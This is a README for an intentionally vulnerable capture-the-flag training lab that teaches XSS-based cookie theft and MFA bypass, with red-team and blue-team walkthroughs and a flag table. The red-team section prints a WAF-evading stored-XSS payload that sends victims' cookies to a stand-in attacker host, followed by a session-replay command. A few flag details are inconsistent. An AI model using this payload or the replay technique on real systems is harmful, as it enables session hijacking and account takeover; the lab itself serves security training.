# Cookie Bypass CTF Lab (Cyber Range)

A self-contained, Docker-deployable training lab simulating a corporate **Admin Feedback System** with a flawed MFA/session model. Built for the "Cybersecurity Engineer (Lab & Range Developer)" practical assessment.

- **Red Team path:** Reconnaissance → WAF/XSS evasion → Cookie theft → MFA bypass via session replay.
- **Blue Team path:** Log forensics → Threat hunting → Incident response via Base64-encoded exfil analysis.

> ⚠️ **This application is intentionally vulnerable.** Every flaw below (reflected/stored XSS, naive WAF, `HttpOnly: false`, trust-on-replay session logic) is a deliberate teaching artifact. Do not deploy outside an isolated lab/internal network zone.

---

## Table of Contents

- [Architecture](#architecture)
- [Deployment](#deployment)
- [Access Details](#access-details)
- [Red Team Walkthrough](#red-team-walkthrough)
- [Blue Team Walkthrough](#blue-team-walkthrough)
- [Flag Reference](#flag-reference)
- [Repository Structure](#repository-structure)
- [Resetting the Lab](#resetting-the-lab)

---

## Architecture

![Cyberrange Architecture](/assets/cyberrange-archi.svg)

**Core flaw being demonstrated:** the app issues a pre-auth cookie (`pre_mfa_session`) with `HttpOnly: false`, exposing it to JavaScript. A naive WAF blocks `<script>` tags but not `<svg onload>` or obfuscated property access, allowing an attacker to steal an authenticated admin's `adm_sess_*` cookie. The backend then trusts any presented `adm_sess_*` cookie without ever re-invoking `/api/verify-mfa` — enabling full session replay and MFA bypass.

---

## Deployment

### Prerequisites
- Proxmox-hosted VM running Ubuntu 22.04 (or similar), with root/sudo access
- VM placed in an internal network zone (documented here as `feedback.admin.local`)
- Outbound internet access during provisioning (to install Docker)

### Steps

```bash
# 1. Clone the repo onto the VM
git clone <your-repo-url> /opt/lab
cd /opt/lab

# 2. Run the provisioning script (installs Docker, creates the Blue Team
#    SSH user, configures sshd on port 2275, builds + starts the stack,
#    and injects the simulated attack logs)
sudo bash scripts/provision_vm.sh

# 3. Confirm the app is reachable
curl -I http://localhost:3075
```

The script is idempotent — re-running it on a redeploy will rebuild containers and regenerate logs cleanly (see [Resetting the Lab](#resetting-the-lab)).

### Manual / non-script deployment
```bash
docker compose up -d --build
python3 scripts/inject_logs.py
```

---

## Access Details

| Service | Address | Credentials |
|---|---|---|
| Web app | `http://<vm-ip>:3075` | n/a (public recon surface) |
| SSH (Blue Team) | `<vm-ip>:2275` | `analyst` / `blue_team_rocks` |
| Logs | `/opt/admin/logs/{access.log, error.log}` | readable by `analyst` |

---

## Red Team Walkthrough

### Phase 1 — Reconnaissance

```bash
# Backend fingerprint
curl -I http://<vm-ip>:3075
#   X-Powered-By: Node.js

# Hidden paths
curl http://<vm-ip>:3075/robots.txt
#   Disallow: /api/verify-mfa

# Restricted area
curl -I http://<vm-ip>:3075/dashboard

# Source hint
curl http://<vm-ip>:3075/ | grep -A5 "ASCII"
#   → ASCII-art comment pointing you at robots.txt

# Pre-auth cookie
curl -i http://<vm-ip>:3075/
#   Set-Cookie: pre_mfa_session=pending_mfa_verification; (no HttpOnly)
```

### Phase 2 — Defense Evasion (WAF Bypass → XSS)

```bash
# Confirm the WAF blocks a textbook payload
curl -X POST http://<vm-ip>:3075/api/feedback \
  -d "message=<script>alert(1)</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"
#   → 403 Blocked by WAF

# Bypass using an HTML5 element the WAF doesn't filter
curl -X POST http://<vm-ip>:3075/api/feedback \
  -d "message=<svg onload=fetch('http://attacker.local/steal?c='+window['docu'+'ment']['coo'+'kie'])>" \
  -H "Content-Type: application/x-www-form-urlencoded"
#   → 200 OK, payload stored
```

**Why this works:**
- The WAF regex only matches `<script` and the literal string `document.cookie` — it has no knowledge of other event-bearing tags or of bracket-notation property access.
- `pre_mfa_session` is set with `HttpOnly: false`, so it's readable by injected JS.
- No restrictive `Content-Security-Policy` is set, so `fetch()` can reach an external listener.

Set up a quick listener to catch the exfil (for your own demo):
```bash
python3 -m http.server 8000   # on attacker.local, or use a request bin
```

Then as the "victim admin," visit `/dashboard` so the stored payload executes in their session and fires the `fetch()`.

### Phase 3 — Initial Access (Session Replay → MFA Bypass)

```bash
# Take the cookie value captured by your listener, then replay it
# directly — from a totally separate client/session — as if you were
# the admin, with no MFA step performed:
curl -i http://<vm-ip>:3075/dashboard \
  -H "Cookie: adm_sess=<stolen-value>"
```

- The response is `200`, the dashboard renders.
- Server-side, `/api/verify-mfa` is **never** invoked for this request (confirm in `access.log` — no matching line).
- The XSS payload is reflected back inside `<div class="xss-payload">...</div>`.
- Buried in the dashboard HTML:
  ```
  SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
  ```

---

## Blue Team Walkthrough

### Phase 1 — Log Forensics

```bash
ssh analyst@<vm-ip> -p 2275
cd /opt/admin/logs
cat access.log
cat error.log
```

What to look for:
- Attacker source IP `10.10.14.50`, User-Agent containing `Mozilla/5.0`
- A successful (`200`) `/dashboard` access at `18:51:55`
- That same request carries an `X-Forwarded-For` header containing a 44-character string that doesn't look like a normal IP — that's your exfiltration artifact.

### Phase 2 — Threat Hunting

- Baseline/legitimate admin traffic originates from `192.168.1.100` — establish this as your "normal" reference traffic.
- The attacker IP `10.10.14.50` clearly falls inside `10.10.14.0/24` — flag the whole subnet as suspect, not just the single host.
- `error.log` records the very first WAF block of a raw `<script>` payload at `18:50:15` — this is attacker recon/probing, well before the successful bypass.
- Grep the attacker's IP against `/api/verify-mfa` across both logs — it never appears. That absence is itself the finding: **the attacker never completed MFA**, yet still reached `/dashboard`.

```bash
grep "10.10.14.50" access.log | grep "verify-mfa"
# (no output — confirms the bypass)
```

### Phase 3 — Incident Response

1. Pull the odd string out of the `X-Forwarded-For` field in `access.log`.
2. Recognize the character set/padding pattern as **Base64**.
3. Decode it:
   ```bash
   echo "<string-from-log>" | base64 -d
   ```
4. This yields the final Blue Team flag.
5. Cross-reference `error.log` — the cookie-reuse event is flagged at `CRITICAL` severity, and a distinct entry at `18:53:10` reads:
   ```
   Authentication bypass anomaly
   ```
   which corroborates the session-replay finding from the Red Team path.

---

## Flag Reference

<details>
<summary>Full flag table (click to expand)</summary>

| Phase | Flag |
|---|---|
| Recon | `SCENARIO75{Node.js}` |
| Recon | `SCENARIO75{/api/verify-mfa}` |
| Recon | `SCENARIO75{/dashboard}` |
| Recon | `SCENARIO75{robots.txt}` |
| Recon | `SCENARIO75{pre_mfa_session}` |
| Recon | `SCENARIO75{pending_mfa_verification}` |
| WAF/XSS | `SCENARIO75{POST}` |
| WAF/XSS | `SCENARIO75{403}` |
| WAF/XSS | `SCENARIO75{<svg>}` |
| WAF/XSS | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` |
| WAF/XSS | `SCENARIO75{False}` |
| WAF/XSS | `SCENARIO75{fetch}` |
| Session Replay | `SCENARIO75{adm_sess}` |
| Session Replay | `SCENARIO75{xss-payload}` |
| Session Replay | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` (final Red flag) |
| Log Forensics | `SCENARIO75{/opt/admin/logs}` |
| Log Forensics | `SCENARIO75{10.10.14.50}` |
| Log Forensics | `SCENARIO75{Mozilla/5.0}` |
| Log Forensics | `SCENARIO75{200}` |
| Log Forensics | `SCENARIO75{18:51:55}` |
| Log Forensics | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=}` |
| Threat Hunting | `SCENARIO75{192.168.1.100}` |
| Threat Hunting | `SCENARIO75{10.10.14.0/24}` |
| Threat Hunting | `SCENARIO75{/opt/admin/logs/error.log}` |
| Threat Hunting | `SCENARIO75{<script>}` |
| Threat Hunting | `SCENARIO75{18:50:15}` |
| Threat Hunting | `SCENARIO75{No}` |
| Incident Response | `SCENARIO75{Base64}` |
| Incident Response | `SCENARIO75{44}` |
| Incident Response | `SCENARIO75{CRITICAL}` |
| Incident Response | `SCENARIO75{18:53:10}` |
| Incident Response | `SCENARIO75{Authentication bypass anomaly}` |
| Incident Response | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` (final Blue flag) |

</details>

---

## Repository Structure

```
.
├── app/                        # Vulnerable Node.js web application
│   ├── src/
│   │   ├── config/             # Environment & flag configurations
│   │   ├── middleware/         # WAF, telemetry logger, session handlers
│   │   ├── routes/             # auth, feedback, dashboard endpoints
│   │   ├── services/           # telemetry, feedback, auth services
│   │   ├── views/              # index.html (ASCII hint), dashboard.html
│   │   ├── public/             # CSS styling, robots.txt
│   │   └── server.js           # Server entry point
│   ├── test_all.js             # Comprehensive 15-check validation suite
│   └── package.json
├── docker/
│   ├── nginx/                  # Nginx reverse proxy Dockerfile & config (Port 3075)
│   └── node/                   # Node.js backend Dockerfile (Port 8080)
├── logs/                       # Access and error logs (/opt/admin/logs)
├── scripts/
│   ├── provision_vm.sh         # Proxmox VM bootstrap script (Docker, SSH, deploy)
│   ├── inject_logs.py          # Generates simulated forensic telemetry
│   ├── red_team_exploit.py     # Automated Red Team 3-phase exploit demonstration
│   ├── blue_team_verify.py     # Automated Blue Team forensic log analysis
│   └── healthcheck.sh          # Endpoint liveness and health verification
├── vm/
│   └── cloud-init.yaml         # Cloud-Init template for unattended Proxmox VM setup
├── docker-compose.yaml         # Multi-container service definitions
├── .env.example
└── README.md                   # Lab documentation & walkthrough
```

### Automated Verification

```bash
# 1. Run Node.js Application Test Suite (All 15 Red Team assertions)
cd app && npm test

# 2. Run Red Team Exploit Chain Demonstration
python3 scripts/red_team_exploit.py http://localhost:3075

# 3. Run Blue Team Log Forensics & Threat Hunting Analysis
python3 scripts/blue_team_verify.py ./logs
```

---

## Resetting the Lab

```bash
docker compose down -v
rm -f logs/*.log
docker compose up -d --build
python3 scripts/inject_logs.py
```

This tears down containers, clears stale log state, and rebuilds/re-injects from a known-clean baseline — useful between live-demo runs.

---

## Notes for Reviewers

- The WAF and session logic are **intentionally** naive; see inline comments in `app/server.js` at each vulnerable code path.
- The Base64 string embedded in `X-Forwarded-For` is generated programmatically by `scripts/inject_logs.py` from the literal flag text, guaranteeing it decodes cleanly and is exactly 44 characters.
- All credentials in this repo (`analyst` / `blue_team_rocks`) are lab-only and intentionally weak/documented — not representative of production practice.